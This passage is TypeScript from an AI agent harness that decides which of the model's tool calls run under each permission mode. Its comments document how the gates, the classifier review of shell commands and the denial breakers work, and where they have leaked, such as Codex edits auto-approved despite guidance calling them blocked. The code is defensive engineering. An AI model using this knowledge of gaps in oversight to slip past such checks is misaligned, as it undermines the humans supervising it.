    workingDirectory?: string;
    /**
     * UB12.60 — where the runtime's tools resolve a RELATIVE path, for the `deniedPaths` floor only (the read fence
     * keeps `workingDirectory`, so its posture does not move). A session with no project has no `workingDirectory`, so
     * without this a relative spelling had no base and a user's deny entry never saw it. ADDITIVE: a relative spelling
     * is judged at this base AND at `workingDirectory` when both are given, because every candidate of that floor can
     * only add a denial ({@link deniedPathRealCandidates}).
     */
    deniedPathBase?: string;
    /**
     * P6.202 — `permissions.blockReadsOutsideWorkingDirectories`, resolved by
     * the caller. Passed rather than read here because this module must not
     * import `config/storage.ts`: `shouldAllowToolInMode` already reaches for
     * `permissions-config.ts` through a lazy `require` to dodge exactly that
     * cycle, and one lazy require is enough for one function.
     */
    blockReadsOutsideWorkingDirectories?: boolean;
    permissionsContext?: PermissionsContext;
    /**
     * The caller is the MODEL's own pre-tool gate, the one the page's plan-mode
     * description is about: "Claude reads files, runs shell commands
     * to explore, and writes a plan". That sentence is the anchor and the number
     * a convenience: `permission-modes.md:238` on the 2026-08-23 fetch — a
     * DIFFERENT line from the shell band's own sentence at `:240`, and neither is
     * the `:156` cited here before (a VS Code UI-label table row).
     * Only there does plan mode hand a
     * non-read-only shell command up for the classifier (or, failing it, a
     * prompt) instead of blocking it outright.
     *
     * Host-side callers leave it unset and keep plan mode's block: a skill's
     * context command and the composer's shell are not commands Claude runs
     * while planning and cannot reach the classifier. A COMMAND HOOK never
     * reaches plan mode here at all since F1.758 — its runner judges it as
     * `default` (`commandHookGateMode`, `plugins/hooks-automation.ts`).
     */
    allowPlanShellReview?: boolean;
    /**
     * F1.1050 — the caller is `core/pre-tool-use.ts`'s MCP MUTATION ORACLE, which asks "would a read-only mode
     * refuse this call? then it is a mutation and it cards" for `default`, `acceptEdits` and `auto`. It passes
     * `plan` with this set; before F1.1050 it passed the retired `explore`. Only the browser branch reads it: a
     * state-changing browser command answers `allowed` (explore's historical verdict) instead of plan mode's
     * chrome.md block, because that block here would add a card in every asking mode. Every other verdict an
     * `mcp__` name can reach is the same in `plan` and `explore` (the write-folder exceptions need a
     * `Write`/`Edit`/`MultiEdit`/`NotebookEdit` or `Bash` name), and `__tests__/mcp-mutation-probe.test.ts`
     * pins those verdicts as measured under `explore`.
     */
    mutationProbe?: boolean;
  }
): ToolCheckResult {
  // Get config: merged custom if context provided, otherwise defaults
  let config: ToolCheckConfig;

  if (options?.permissionsContext) {
    // Lazy import to avoid circular dependency
    const { permissionsConfigCache } = require('./permissions-config.ts');
    config = permissionsConfigCache.getMergedConfig(options.permissionsContext);
  } else {
    config = SAFE_MODE_CONFIG;
  }

  const deniedPath = getDeniedPathViolation(toolName, toolInput, config, [options?.workingDirectory, options?.deniedPathBase]); // F1.1120: the base a relative target resolves against — the same input the read fence takes; UB12.60: + where the runtime's tools run
  if (deniedPath) {
    return {
      allowed: false,
      reason: `Sensitive path blocked: ${toolName} attempted to access ${deniedPath.path} (matched deniedPaths pattern ${deniedPath.pattern}).`,
      denyPathBlocked: true,
    };
  }

  // P6.202 — the operator's read fence, beside the two floors above and for the
  // same reason: the page places it among the actions "Claude Code doesn't
  // auto-approve … in any mode, including `bypassPermissions`", and this is the
  // only band of this function that runs before the bypass early return.
  const outsideRead = getReadsOutsideWorkingDirectoriesViolation(toolName, toolInput, options ?? {});
  if (outsideRead) {
    return {
      allowed: false,
      reason: `Read blocked outside the working directories: ${toolName} attempted to read ${outsideRead.path}, `
        + 'and permissions.blockReadsOutsideWorkingDirectories is on, which refuses such reads in every '
        + 'permission mode including bypassPermissions. Add the directory with additionalDirectories to read it, '
        + 'or turn the setting off.',
    };
  }

  // P6.212: a `pkill` matching our own process ends the session mid-turn. This is
  // a self-destruct guard, not a permission question, so it sits with
  // `getDeniedPathViolation` above the `bypassPermissions` early return and binds
  // in EVERY mode. See `getSelfTerminatingKillPattern` for the platform decision,
  // the subprocess-free mechanism and the residue it does not cover.
  if (toolName === 'Bash') {
    const bashInput = toolInput as Record<string, unknown> | null;
    const bashCommand = bashInput?.command;
    if (typeof bashCommand === 'string') {
      const selfKill = getSelfTerminatingKillPattern(bashCommand);
      if (selfKill) {
        return {
          allowed: false,
          reason: `Self-terminating command blocked: the pkill pattern "${selfKill.pattern}" matches this agent's own process ("${selfKill.matched}"), so running it would end the session mid-turn. Narrow the pattern, or target the process by pid.`,
        };
      }
    }
  }

  const deniedToolPattern = matchesDeniedToolPattern(toolName, config.deniedToolPatterns);
  if (deniedToolPattern) {
    return {
      allowed: false,
      reason: `Tool blocked: ${toolName} matched deniedToolPatterns pattern ${deniedToolPattern}.`,
    };
  }

  const disallowedToolPattern = matchesToolPattern(toolName, config.disallowedTools, 'disallowedTools');
  if (disallowedToolPattern) {
    return {
      allowed: false,
      reason: `Tool blocked: ${toolName} matched disallowedTools pattern ${disallowedToolPattern}.`,
    };
  }

  if (config.allowedTools && config.allowedTools.length > 0) {
    const allowedToolPattern = matchesToolPattern(toolName, config.allowedTools, 'allowedTools');
    if (!allowedToolPattern) {
      return {
        allowed: false,
        reason: `Tool blocked: ${toolName} is not included in allowedTools.`,
      };
    }
  }

  const toolRule = toolRuleUnderSessionToolStandIn(toolName, name => matchesToolPermissionRule(name, config.toolRules)); // F1.1175 — a WebSearch deny refuses the app's search too
  if (toolRule) {
    const description = formatToolRuleDescription(toolName, toolRule);
    if (toolRule.action === 'deny') {
      return {
        allowed: false,
        reason: `Tool blocked: ${description}`,
      };
    }
    if (toolRule.action === 'ask') {
      // `dontAsk` never prompts, so a rule that asks has nobody to ask: deny
      // rather than hand back a prompt the mode cannot show. This is the same
      // documented resolution Claude applies to org-level `ask` connector rules.
      // `askRuleDenied` marks the denial as an ask-rule non-negotiable so the
      // R15 band never hook-approves it (pure data — no hook I/O here).
      if (mode === 'dontAsk') {
        return {
          allowed: false,
          reason: `Tool blocked: ${description} — ${PERMISSION_MODE_AGENT_LABELS.dontAsk} mode never prompts.`,
          askRuleDenied: true,
        };
      }
      return {
        allowed: true,
        requiresPermission: true,
        description,
      };
    }
    return { allowed: true };
  }

  // In bypassPermissions mode, all tools are allowed (no restrictions)
  if (mode === 'bypassPermissions') {
    return { allowed: true };
  }

  // In interactive write modes, all tools are allowed; prompting is handled later.
  // `dontAsk` is deliberately NOT in that set: it has no later prompt, so it
  // falls through to the read-only allowlist below and denies everything else.
  if (isInteractiveWritePermissionMode(mode)) {
    return { allowed: true };
  }

  // F1.1097 — the deferred-tool plumbing passes `plan` and `dontAsk` too, as Claude's own `ToolSearch` does
  // (`tools-reference.md`: "Searches for and loads deferred tools …", Permission required "No";
  // `permission-modes.md#allow-only-pre-approved-tools-with-dontask-mode`: dontAsk "still runs actions that need no
  // approval"). A search returns names and a load registers a schema; neither acts, and the LOADED tool's own call
  // meets this gate like any other. Below the deny rules on purpose: a rule naming the loader still refuses it.
  if (isDeferredToolDiscovery(toolName) || isDeferredToolLoad(toolName)) {
    return { allowed: true };
  }

  const modeDisplayName = resolveModeDisplayName(mode, config);
  // The blocked-tool branch builds its own via `getBlockReasonWithConfig`; this
  // is the same hint for the five sibling block messages below, so one session
  // cannot be offered two different ways out of the same mode.
  const modeEscapeHint = formatModeBlockEscapeHint(mode, config.shortcutHint);

  // `dontAsk` narrows to Claude's three sources — allow rules (handled above),
  // the read-only set, and hook allows (the pre-tool-use seam). WebFetch is
  // PERMISSION-REQUIRED per tools-reference.md and the browser tool's
  // state-changing commands prompt per chrome.md's plan-mode split, so both
  // leave dontAsk's auto-run set: with nobody to prompt, they deny. F1.1049
  // (owner 2026-09-28): WebSearch is PRE-APPROVED by default and runs here as a
  // hook allow — permission-modes.md: dontAsk runs "calls approved by a PreToolUse
  // hook"; every deny rule above, and Claude's own deny rules after it, still win.
  if (mode === 'dontAsk'
    && (toolName === 'WebFetch' || isBrowserToolNameOrAlias(toolName))) {
    return {
      allowed: false,
      reason: `Tool blocked: ${toolName} requires permission, and ${PERMISSION_MODE_AGENT_LABELS.dontAsk} mode never prompts. An explicit allow rule can pre-approve it.`,
    };
  }

  // Safe/Plan mode: check against read-only allowlist

  // Always-allowed tools (read-only by nature)
  if (ALWAYS_ALLOWED_TOOLS.has(toolName)) {
    return { allowed: true };
  }

  // Check if tool name ends with an always-allowed tool (for MCP variants like mcp__plan__SubmitPlan)
  for (const allowedTool of ALWAYS_ALLOWED_TOOLS) {
    if (toolName.endsWith(`__${allowedTool}`)) {
      return { allowed: true };
    }
  }

  // Browser tool — every spelling (canonical `browser_tool`, the
  // `mcp__session__` namespaced form, and the legacy browser_open/... aliases)
  // lands here: ONE decision site, keyed on the COMMAND rather than the tool
  // name. chrome.md ("Browser tools in plan mode"): "browser tool calls that
  // only read the page or browser state run without a permission prompt, and
  // calls that change state prompt for approval" — and a batch runs promptless
  // only when every action inside it is read-only.
  if (isBrowserToolNameOrAlias(toolName)) {
    if (isReadOnlyBrowserToolInput(toolInput)) {
      return { allowed: true };
    }
    if (mode === 'plan' && options?.mutationProbe !== true) {
      const commandText = describeBrowserToolCommand(toolInput);
      // The same negotiable band as plan mode's shell review below: only the
      // model's own pre-tool gate passes `allowPlanShellReview`, so only there
      // may the classifier (or, failing it, a human prompt) answer. Host-side
      // callers that did not opt into the band keep plan mode's block.
      if (options?.allowPlanShellReview) {
        return {
          allowed: true,
          requiresPermission: true,
          description: `Browser command changes page or browser state: ${commandText}`,
          planShellReview: true,
        };
      }
      return {
        allowed: false,
        reason: `Browser command blocked (${modeDisplayName} mode): "${commandText}" changes page or browser state. Only read-only browser commands (snapshot, find, screenshot, console, network, windows, wait, downloads, get-clipboard) run without approval. ${modeEscapeHint} to run it.`,
      };
    }
    // The MCP mutation probe (`mutationProbe`, F1.1050) keeps the retired
    // Explore's historical allow for state-changing browser commands: chrome.md
    // binds PLAN mode only, and a deny here would also flip
    // `default`/`acceptEdits` into prompting through pre-tool-use's MCP
    // mutation oracle — a mode-wide behaviour change that is its own decision,
    // not a side effect to ship from this branch.
    return { allowed: true };
  }

  // Handle Bash - check if command is read-only
  // Uses detailed rejection reasons to provide helpful error messages
  if (toolName === 'Bash') {
    const input = toolInput as Record<string, unknown> | null;
    const command = input?.command;
    if (typeof command === 'string') {
      const rejection = getBashRejectionReason(command, config);
      if (!rejection) {
        // Command is safe - no rejection reason means it passed all checks
        return { allowed: true };
      }

      // F1.1050: the retired `explore`'s shell-redirect exception (a redirect into the
      // plans, data or additional folders ran uncarded) did not carry over to plan —
      // plan keeps its shell band below, so such a redirect is reviewed like any write.

      // PLAN mode does not block a shell command outright.
      // The whole line is the anchor; `permission-modes.md:240` on the
      // 2026-08-23 fetch is only a convenience (the `:156` cited here before is
      // a VS Code UI-label table row there): "When auto mode is available and
      // the `useAutoModeDuringPlan` setting is on, which it is by default, the
      // classifier reviews shell commands during planning instead of prompting
      // you. Approved commands run, and rejected ones are blocked. Otherwise,
      // commands outside the built-in read-only set prompt for approval,
      // including when the sandbox's auto-allow mode is enabled."
      //
      // Both branches end in a decision this layer cannot make, so both are the
      // same answer HERE: hand the call up as needing approval and mark it as
      // plan mode's shell band. `safe` keeps the outright block — plan mode is
      // the only mode the sentence is about.
      if (mode === 'plan' && options?.allowPlanShellReview) {
        return {
          allowed: true,
          requiresPermission: true,
          description: formatBashRejectionMessage(rejection, config, mode),
          planShellReview: true,
        };
      }

      // Return detailed error message explaining exactly why the command was blocked
      return {
        allowed: false,
        reason: formatBashRejectionMessage(rejection, config, mode),
      };
    }
    // No command provided - block with generic message
    return {
      allowed: false,
      reason: `Bash command is missing or invalid. ${modeEscapeHint} to run it.`,
    };
  }

  // Handle Write/Edit/MultiEdit/NotebookEdit - allow if targeting plans folder or allowedWritePaths
  if (toolName === 'Write' || toolName === 'Edit' || toolName === 'MultiEdit' || toolName === 'NotebookEdit') {
    const filePath = extractFileToolTargetPath(toolInput);

    if (filePath) {
      // Check plans folder exception
      if (isPlanModePlanFileWrite(mode, toolName, filePath) && options?.plansFolderPath) { // F1.725: plan mode's own .md plan file
        debug(`[Mode] Checking plans folder exception: path="${filePath}", plansDir="${options.plansFolderPath}"`);
        if (isPathWithinDirectory(filePath, options.plansFolderPath)) {
          debug(`[Mode] Allowing ${toolName} to plans folder`);
          return { allowed: true };
        }
      }

      // Check data folder exception. F1.1050: `plan` absorbs the retired `explore`'s session data-folder
      // write (all four file tools, any file); explore's additional directories and `allowedWritePaths`
      // did NOT carry over, since either would let plan edit source (UB7.6 / OQ-43.7 (a):
      // `allowedWritePaths` is now read by the DEFAULT (Ask) mode only — the suppression lives in
      // `shouldPromptInAskMode` — and NEVER here: plan still refuses every source write).
      if (mode === 'plan' && options?.dataFolderPath && isPathWithinDirectory(filePath, options.dataFolderPath)) {
        debug(`[Mode] Allowing ${toolName} to data folder`);
        return { allowed: true };
      }
    }
  }

  // Blocked tools (Write, Edit, MultiEdit, NotebookEdit)
  if (config.blockedTools.has(toolName)) {
    return {
      allowed: false,
      reason: getBlockReasonWithConfig(toolName, config, mode)
    };
  }

  // Handle MCP tools - allow read-only, block write operations
  if (toolName.startsWith('mcp__')) {
    // Handle session-scoped tools - derive safe-mode behavior from canonical session-tools-core metadata
    if (toolName.startsWith('mcp__session__')) {
      // P3.311 — classify over the WHOLE REGISTRY, by declaration.
      //
      // This used to call `getSessionSafeAllowedToolNames`, whose projection
      // filters answer a DIFFERENT question: what do we ADVERTISE. Called from
      // here with no `projection` and no per-session facts, those filters
      // collapsed onto the authorization verdict, and SEVEN tools that declare
      // `safeMode: 'allow'` were refused in Explore anyway — `Task`,
      // `TaskCreate`, `TaskUpdate`, `TaskGet`, `TaskList`,
      // `list_mcp_resources`, `read_mcp_resource`. All seven are
      // `visibility: 'pi-only'`, four of them `readOnly`, so the refusal bit on
      // PI ONLY, in Explore only, and it arrived wearing "Session configuration
      // changes are blocked" — a sentence false twice over. 33 declared allow,
      // 26 reaching the gate. A control that silently DENIES, and per runtime.
      //
      // W2-n reached the same diagnosis one tool earlier (`36839ff94`,
      // `ReviewDiff`) and moved the OFFER gate out of `getSessionToolDefs`.
      // This is that principle applied to the classifier: **availability is
      // not authorization.** Whether a tool is advertised is decided by the
      // offer surfaces and by the registry the call resolves through;
      // `shouldAllowToolInMode` answers only "if this is called, may it run".
      //
      // Nothing is widened by this that could actually be reached. Measured:
      // with `NESSY_DISABLE_CRON=1`, `CronList` is absent from BOTH
      // `getSessionToolDefs()` and `getSessionToolRegistry()` (control:
      // `SubmitPlan` present in the same run), so a switched-off tool cannot
      // resolve, and if a call somehow arrives its handler refuses it BY NAME —
      // which is the better error. The tools whose Explore verdict moves at all
      // are exactly those whose availability switch is off: `CronList` under
      // `NESSY_DISABLE_CRON`, the four `Task*` under the tasks opt-out, and
      // `send_developer_feedback` behind its flag. In the default environment
      // only the seven above change, and they change from a false refusal to
      // the verdict their declaration always stated.
      if (SESSION_SAFE_ALLOWED_TOOL_NAMES.has(toolName.slice('mcp__session__'.length))) {
        return { allowed: true };
      }

      // Write/auth/admin session tools - blocked by the read-only allowlist (Plan, Don't ask)
      return {
        allowed: false,
        reason: `Session configuration changes are blocked in ${modeDisplayName}. ${modeEscapeHint} ${sessionConfigRefusalTail(toolName.slice('mcp__session__'.length))}.`
      };
    }

    // Handle API tools exposed via MCP (mcp__<source>__api_<name>)
    // These need endpoint-level permission checks, not just MCP read-only patterns
    if (toolName.includes('__api_')) {
      const input = toolInput as Record<string, unknown> | null;
      const method = (input?.method as string) || 'GET';
      const path = input?.path as string | undefined;
      if (isApiCallAllowedWithConfig(method, path, config, toolName)) {
        return { allowed: true };
      }
      return {
        allowed: false,
        reason: `API ${method} ${path ?? ''} is blocked in ${modeDisplayName}. ${modeEscapeHint} to make changes.`
      };
    }

    if (isReadOnlyMcpToolWithConfig(toolName, config)) {
      return { allowed: true };
    }
    return {
      allowed: false,
      reason: `MCP write operations are blocked in ${modeDisplayName}. ${modeEscapeHint} to make changes.`
    };
  }

  // Handle API tools - allow GET, block mutations unless endpoint is whitelisted
  if (toolName.startsWith('api_')) {
    const input = toolInput as Record<string, unknown> | null;
    const method = (input?.method as string) || 'GET';
    const path = input?.path as string | undefined;
    if (isApiCallAllowedWithConfig(method, path, config, toolName)) {
      return { allowed: true };
    }
    return {
      allowed: false,
      reason: `API ${method} ${path ?? ''} is blocked in ${modeDisplayName}. ${modeEscapeHint} to make changes.`
    };
  }

  // Default: allow other tools not explicitly handled
  return { allowed: true };
}

/**
 * Get a user-friendly message explaining why a tool is blocked.
 *
 * `mode` is not optional and is not decoration: the message used to name
 * `config.displayName` and offer `formatModeSwitchHint(config.shortcutHint)`,
 * and BOTH were Explore's copy for every caller (see
 * {@link resolveModeDisplayName}). A `plan` or `dontAsk` session was told
 * "blocked in Explore" and pointed at Explore's way out — measured on both
 * modes before P2.32. Which calls are blocked is unchanged; only the words are.
 */
function getBlockReasonWithConfig(toolName: string, config: ToolCheckConfig, mode: PermissionMode): string {
  const displayName = resolveModeDisplayName(mode, config);
  const escapeHint = formatModeBlockEscapeHint(mode, config.shortcutHint);

  if (toolName === 'Bash') {
    return `Bash commands are blocked in ${displayName}. ${escapeHint} to run commands.`;
  }
  if (toolName === 'Write' || toolName === 'Edit' || toolName === 'MultiEdit') {
    return `File modifications are blocked in ${displayName}. ${escapeHint} to make changes.`;
  }
  // No `mcp__` branch here, deliberately, and the absence is the fix (P2.214).
  // This function is called from ONE place — the `config.blockedTools` branch,
  // which matches on the tool NAME — so an `mcp__` name that arrives here was
  // refused for its name and NOT for being a write. It said "MCP write
  // operations are blocked" anyway, which P2.39 measured on
  // `mcp__linear__read_issue`: a READ tool, allowed by the very same config's
  // `allowedMcpPatterns`, refused with the write rule. A message that names an
  // operation class the branch never established teaches the wrong rule to
  // whoever debugs it. The generic tail below names the tool instead, which is
  // the only thing this branch actually knows. The `mcp__` sibling in
  // `shouldAllowToolInMode` keeps its wording: it fires only after
  // `isReadOnlyMcpToolWithConfig` has answered false, so there the write claim
  // is earned.
  if (toolName.startsWith('api_')) {
    return `API mutations are blocked in ${displayName}. ${escapeHint} to make changes.`;
  }
  return `${toolName} is blocked in ${displayName}. ${escapeHint} to use this tool.`;
}

/**
 * Deny ONE tool call and let the agent carry on.
 *
 * The shape is load-bearing and the previous one was wrong in a way that cost a
 * measured, user-visible defect: in Explore mode the first blocked write ended
 * the turn with **no assistant message at all** — the user asked for something,
 * the tool was refused, and nothing came back.
 *
 * What it used to return was `{ continue: false, decision: 'block', reason }`,
 * under a comment claiming that was "the correct SDK format". `hooks.md`, the
 * JSON-output table, says otherwise on both counts:
 *
 *   `continue` — "If `false`, Claude stops processing entirely after the hook
 *   runs. **Takes precedence over any event-specific decision fields**"
 *   `stopReason` — "Message shown to the user when `continue` is `false`.
 *   **Not shown to Claude**"
 *
 * So the block did stop the tool, and it also stopped the agent, and the reason
 * never reached the model that was supposed to explain it. The same page's
 * § PreToolUse decision control gives the shape for denying one call: "Unlike
 * other hooks that use a top-level `decision` field, PreToolUse returns its
 * decision inside a `hookSpecificOutput` object", where `permissionDecision:
 * "deny"` "prevents the tool call" and `permissionDecisionReason` is, for deny,
 * "shown to Claude". `PreToolUseHookSpecificOutput` in the SDK's own `sdk.d.ts`
 * carries exactly those fields.
 *
 * This was found while measuring an upstream regression note that blamed the
 * SDK version. It is not the SDK: the behaviour is identical on 0.3.215 and
 * 0.3.218, and it is this payload.
 */
export function denyToolWithReason(reason: string) {
  return {
    hookSpecificOutput: {
      hookEventName: 'PreToolUse' as const,
      permissionDecision: 'deny' as const,
      permissionDecisionReason: reason,
    },
  };
}

/**
 * Deny a tool and mark the reason as an error for the model.
 *
 * The "[ERROR]" prefix stays: see the detailed comment on `errorResponse()` in
 * `packages/session-tools-core/src/response.ts` for why a blocked call has to be
 * distinguishable from a successful one in the text the model reads.
 *
 * @param reason - The reason for blocking (from shouldAllowToolInMode)
 */
export function blockWithReason(reason: string) {
  return denyToolWithReason(`[ERROR] ${reason}`);
}

// ============================================================
// Session State Context (for user messages)
// ============================================================

/**
 * Get the current session state for prompt injection
 */
export function getSessionState(key: SessionKey): { permissionMode: PermissionMode } {
  return {
    permissionMode: getPermissionMode(key),
  };
}

/**
 * Mode-scoped guidance injected through the volatile session-state block (not
 * the static system prompt), so it recomputes per turn as the active mode
 * changes and never destabilizes the cached system prefix. This is the ONLY
 * place per-mode permission facts live — the static prompt keeps just a
 * one-line awareness that other modes exist and the user can switch. Tool-level
 * enforcement remains the sole authority; every line here is guidance text.
 *
 * Each mode emits exactly ONE coherent `modeGuidance:` line covering, for the
 * ACTIVE mode only: what runs freely, what needs approval, how to proceed when
 * blocked, and — where it applies — the autonomy/persistence or plan persona.
 * The mode NAME each line opens with is interpolated from
 * `PERMISSION_MODE_AGENT_LABELS` (pinned byte-equal to the `en` locale by
 * mode-label-source.test.ts) — never an inline literal — so the agent channel
 * cannot drift from the words the composer shows. The permission facts stay
 * consistent with the i18n `mode.*FullDesc` descriptions.
 *
 * - `dontAsk` (Unattended): never prompts; only rule-pre-approved tools run.
 * - `plan`: read-only planning bar its .md plan and the data folder (F1.1051); the
 *   deliverable is the plan; SubmitPlan to proceed. (Persona: messages refine, not end.)
 * - `default` (Manual): reads run freely; edits and other mutations prompt
 *   before running.
 * - `acceptEdits`: file edits auto-accept; shell/network/MCP mutations prompt.
 * - `auto`: low-risk actions auto-run; risky shell/network/MCP/API changes prompt.
 * - `bypassPermissions`: full autonomy — no approval prompts. (Autonomy
 *   and Persistence adapted from openai/codex, Apache-2.0.)
 *
 * ## P3.238 — two of these lines were FALSE on codex, and the model reads them
 *
 * This function was runtime-independent, and `explore`/`plan` each stated two
 * things codex cannot back. Both were measured before being changed, because an
 * identifier probe alone is biased toward false absence:
 *
 *  1. **"file edits … are blocked"** — nothing of ours blocks them on codex.
 *     `runPreToolUseChecks` has 0 hits in `codex-agent.ts` (controls on the same
 *     rig: pi 10, claude 2), and the sandbox that would have held the line is
 *     off by standing owner decision: `SANDBOX_ENABLED_DEFAULT === false`
 *     (`config/sandbox-settings.ts`) makes `codexSandboxConfigForMode` emit
 *     `danger-full-access`/`on-request` for `explore` and `plan` alike. Read
 *     forward into codex's own source at the tag we ship (`rust-v0.148.0`, the
 *     pin in `codex-protocol/package.json`) that pair is not merely unenforced,
 *     it is auto-approved: `SandboxPolicy::DangerFullAccess =>
 *     FileSystemSandboxPolicy::unrestricted()` (`protocol/src/permissions.rs`),
 *     `unrestricted` answers `has_full_disk_write_access() == true`, so
 *     `is_write_patch_constrained_to_writable_paths` returns `true` at its first
 *     line and `assess_patch_safety` (`core/src/safety.rs`) reaches
 *     `SafetyCheck::AutoApprove` down BOTH of its remaining branches. No
 *     `applyPatchApproval` is raised, so `CodexAgent.consultPermissionRules` and
 *     the user's card never run either. The model was told a restraint that does
 *     not exist and could decline work it is permitted to do.
 *  2. **"call SubmitPlan"** — codex never advertises the tool, so the instructed
 *     exit from plan mode does not exist there. DRIVEN rather than grepped
 *     (2026-08-29): the real `session-mcp-server` over MCP stdio, spawned with
 *     `CodexAgent.buildSessionMcpSpec`'s own argv
 *     (`--external-standalone-only --host-callback-port … --advisor-consult`),
 *     answers `tools/list` with 27 tools and no `SubmitPlan`; positive controls
 *     `advisor_consult`, `Monitor` and `source_test` are present in that same
 *     answer, and the same server without `--external-standalone-only` lists 45
 *     tools INCLUDING `SubmitPlan`. It is in `SESSION_TOOLS_REQUIRING_HOST_CALLBACK`
 *     and not in `SESSION_TOOLS_BRIDGED_BY_HOST_CALLBACK`, which is why the
 *     bridge does not lift it.
 *
 * The fix makes the GUIDANCE true per runtime rather than making the behaviour
 * match the guidance: actually gating edits on codex is P3.236's territory, and
 * either way it would be a change to what the model may do rather than to what
 * it is told. So the codex lines keep the same INSTRUCTION (do not edit; writes
 * belong in plansFolderPath/dataFolderPath) and stop calling it a block —
 * neither widening nor narrowing what is permitted.
 *
 * Same split the USER-facing surface already made for the same reason
 * (`renderer/lib/composer-permission-modes.ts`,
 * `RUNTIME_PERMISSION_MODE_CLAUSE_KEYS`, whose codex entries are `dontAsk`,
 * `explore` and `plan`). Branching on `backendName` is `prompts/system.ts`'s
 * existing idiom (`backendName === 'Codex'`), reused rather than reinvented.
 *
 * The other five modes are deliberately UNCHANGED here. `default`,
 * `acceptEdits` and `auto` promise a prompt codex does not guarantee either, but
 * that is a wider statement — it would tell the model on every codex turn that
 * our gates are advisory — and it is recorded as its own row rather than
 * smuggled in beside a string fix.
 *
 * @param backendName - `BaseAgent.backendName` of the runtime this turn runs on,
 *   when the caller knows it. Absent means the runtime-independent wording, so
 *   every existing caller and every non-codex runtime is byte-unchanged.
 */
/**
 * The `explore` and `plan` lines as codex can actually back them — see the two
 * measurements on {@link formatModeGuidance}.
 *
 * Three properties every reviewer should be able to check by reading, because
 * each of them is what the runtime-independent line got wrong:
 *
 *  - the INSTRUCTION is unchanged (no edits; writes belong in plansFolderPath
 *    and dataFolderPath), so nothing the model may do widens or narrows;
 *  - the word "blocked" is gone, and the reason is stated where the model reads
 *    it rather than left for it to discover — the sentence is the same fact the
 *    composer footer already tells the USER
 *    (`chat.permissionModeRuntimeNote.codex`: "On Codex the runtime decides
 *    which actions to raise — Nessy checks each raised action against its own
 *    limits and rules before it runs."). The footer carried an "except in
 *    Bypass" tail when this was written; P6.572 (`526f6983a`) removed it and
 *    W13-k (`e706e113b`) appended an unattended-fallback clause after it —
 *    neither reaches this line, which mirrors the FIRST sentence only, and the
 *    first sentence is the half that has not moved;
 *  - the exit is one that EXISTS here. Codex has no `SubmitPlan` and therefore
 *    no plan card, so the plan is presented in the reply and the user is asked
 *    to switch modes. The plan FILE is "when you can" rather than an
 *    instruction, deliberately: in both sandbox master switch positions (the
 *    switch-off half since F1.787, the profile's `:read-only` parent) —
 *    `CODEX_PERMISSION_MODE_TABLE` gives both modes `read-only`, which takes the
 *    scoped plans/data writes away too (`config-writer.ts` records that
 *    narrowing). One sentence that is true in both switch positions beats two
 *    that each need a footnote.
 *
 * ## P3.328 — the second half of that sentence stopped being true, and was
 * rewritten rather than dropped
 *
 * Both lines used to read "that is a rule you keep rather than a block you will
 * hit: the runtime decides what to ask about, and Nessy does not check each
 * action before it runs". That was written against a runtime that asked about
 * nothing, and P2.197 changed the runtime: with the sandbox master switch off,
 * `degradeUnboundedApprovalPolicy` now maps `on-request` to `untrusted` for
 * every mode but `bypassPermissions`, and `untrusted` is `AskForApproval::
 * UnlessTrusted`, on which `assess_patch_safety` (`core/src/safety.rs`,
 * `rust-v0.148.0`) returns `SafetyCheck::AskUser` on its FIRST match — before
 * the writable-path check and before the sandbox policy is consulted at all. So
 * codex raised every patch (P2.197: 6 of 7 modes reached our floor) until
 * rust-v0.150.1 retired `untrusted`; F1.787 (2026-09-26) gives these two modes a
 * `:read-only` profile in both switch positions, so a patch is raised again.
 *
 * The replacement keeps the clause that became MORE true (codex decides what to
 * raise), replaces the false one, and drops "a rule you keep rather than a block
 * you will hit" entirely — that clause is the half whose truth depends on the
 * sandbox master switch, and this docblock's own last bullet says a sentence
 * here has to be true in both switch positions. With the switch ON,
 * `CODEX_PERMISSION_MODE_TABLE` gives both modes `read-only` and codex refuses
 * natively, which is a block, and since F1.787 the profile does so off it too.
 * "The runtime decides which actions to raise, and Nessy checks each
 * raised action" is true either way. The INSTRUCTION is still untouched, and
 * "blocked" is still absent, so neither property above regresses.
 *
 * The user-facing twin (`chat.permissionModeRuntimeNote.codex`) was rewritten in
 * the same words by `7843b293b`, locale-only and alone; this is its code half.
 */
function formatCodexModeGuidance(label: string): string { // F1.1050: plan only — the retired explore's line went with it
  return `modeGuidance: ${label} mode — read-only planning by intent, and on this runtime the runtime decides which actions to raise: Nessy checks each raised action against its own limits and rules before it runs. Non-mutating exploration runs freely. Planning is not doing: make no file changes, and a user message during planning refines the plan rather than ending plan mode. The deliverable is the plan itself, and there is no SubmitPlan tool here — present the plan in your reply (writing it under plansFolderPath when you can) and ask the user to leave ${label} mode to carry it out. Session-configuration tools (automations, sources, preferences, labels) and the write tools of connected sources are refused in this mode; the runtime reports such a refusal to you as "user rejected MCP tool call", but that refusal comes from this mode, not from the user.`;
}

/**
 * What a RUN of denials does under Auto, said per runtime (P6.201).
 *
 * ## Why here and not on the picker line
 *
 * The user-facing declaration this row asks for belongs on the composer's mode
 * picker — and MEASURED, that surface cannot carry it. Its description column
 * is one rendered line, and
 * `renderer/lib/__tests__/composer-permission-modes.test.ts` enforces a
 * per-locale character budget derived from a live pixel measurement: en 78, ru
 * 72, for the WHOLE line. `mode.autoFullDesc` is already 51 characters in en
 * and 52 in ru, leaving **26 characters in English and 19 in Russian** for a
 * clause. Nineteen Cyrillic characters cannot state a scope and an effect, and
 * a telegraphic clause is worse than none. A first attempt at that surface
 * measured 110 characters against the 78 budget, which is how the constraint
 * was found rather than assumed.
 *
 * So the declaration lands on the mode description that has room — this one,
 * read by the model — and the USER-facing half is the switch-cost row, which
 * lives in a file this lane does not hold (reported as a hand-off).
 *
 * ## What is being declared, measured at HEAD
 *
 * The row calls them "three auto-mode denial breakers with three different
 * thresholds". Two refinements, both from reading the code:
 *
 * - There are **two threshold sets, not three.** `CodexAutoReviewBreaker`
 *   IMPORTS `GUARDIAN_CONSECUTIVE_DENY_LIMIT` (3) and `GUARDIAN_WINDOW_DENY_LIMIT`
 *   (10 of 50) from `core/guardian-consult.ts` — the same pair Pi's per-turn
 *   circuit breaker uses. The second set is Pi's alone:
 *   `PiAgent.autoClassifierBlocks`, 3 consecutive or 20 total.
 * - There are **two mechanisms on Pi, not one.** The shared per-turn breaker
 *   falls the turn back to the human prompt; the session-scoped counter above it
 *   calls `setPermissionMode('default')`. Only the second changes what mode the
 *   user is in, which is why it is the one the clause names.
 *
 * Claude counts nothing: `GuardianConsultState` / `registerConsult` appear in
